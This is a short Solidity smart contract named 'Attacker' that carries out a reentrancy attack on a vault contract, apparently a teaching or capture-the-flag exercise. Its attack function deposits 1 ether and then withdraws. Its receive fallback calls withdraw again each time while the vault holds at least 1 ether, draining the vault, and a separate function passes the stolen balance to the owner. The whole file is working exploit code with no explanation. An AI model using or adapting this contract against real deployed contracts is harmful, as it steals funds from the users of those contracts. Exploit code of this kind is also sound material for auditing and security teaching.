// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IVulnerableVault {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {

    IVulnerableVault public vault;
    address public owner;

    constructor(address _vault) {
        vault = IVulnerableVault(_vault);
        owner = msg.sender;
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }

    function attack() external payable {
        require(msg.sender == owner, "NOT_OWNER");
        require(msg.value >= 1 ether, "NEED_MORE_ETH");

        vault.deposit{value: 1 ether}();
        vault.withdraw();
    }

    function withdrawAll() external {
        require(msg.sender == owner, "NOT_OWNER");
        payable(owner).transfer(address(this).balance);
    }
}
